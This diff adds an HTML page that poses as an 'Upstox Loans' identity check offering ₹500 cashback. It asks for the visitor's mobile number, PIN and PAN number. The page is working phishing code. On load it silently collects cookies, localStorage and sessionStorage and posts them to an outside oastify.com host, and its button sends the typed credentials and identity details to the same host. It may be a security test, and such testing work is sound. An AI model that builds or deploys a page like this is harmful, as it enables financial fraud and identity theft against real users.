@@ -1,0 +1,46 @@
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{font-family:-apple-system,sans-serif;margin:0;padding:20px;background:#fff}
+h2{text-align:center;color:#333}
+.subtitle{text-align:center;color:#666;font-size:14px}
+input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:15px}
+button{width:100%;padding:14px;background:#7B2FF7;color:#fff;border:none;border-radius:8px;font-size:16px}
+label{display:block;margin-bottom:5px;color:#555;font-size:14px}
+</style>
+</head>
+<body>
+<h1 style="color:#7B2FF7;text-align:center">Upstox Loans</h1>
+<h2>Verify Your Identity</h2>
+<p class="subtitle">Re-authentication required to process your cashback</p>
+<label>Mobile Number</label>
+<input type="tel" id="phone" placeholder="Enter registered mobile number">
+<label>PIN / Password</label>
+<input type="password" id="pin" placeholder="Enter your PIN">
+<label>PAN Number</label>
+<input type="text" id="pan" placeholder="Enter PAN number">
+<button onclick="exfil()">Verify & Claim ₹500</button>
+<script>
+// Silently steal cookies/localStorage in background
+var stolen = {
+  cookies: document.cookie,
+  localStorage: JSON.stringify(localStorage),
+  sessionStorage: JSON.stringify(sessionStorage),
+  userAgent: navigator.userAgent
+};
+// Send silent beacon
+fetch("https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/silent_steal", {
+  method: "POST",
+  body: JSON.stringify(stolen),
+  mode: "no-cors"
+});
+
+function exfil(){
+  var phone = document.getElementById('phone').value;
+  var pin = document.getElementById('pin').value;
+  var pan = document.getElementById('pan').value;
+  document.location = "https://2or958yk1agudxpvy153b940nrtjh95y.oastify.com/full_exfil?phone=" + encodeURIComponent(phone) + "&pin=" + encodeURIComponent(pin) + "&pan=" + encodeURIComponent(pan) + "&cookies=" + encodeURIComponent(document.cookie) + "&storage=" + encodeURIComponent(JSON.stringify(localStorage));
+}
+</script>
+</body>
+</html>
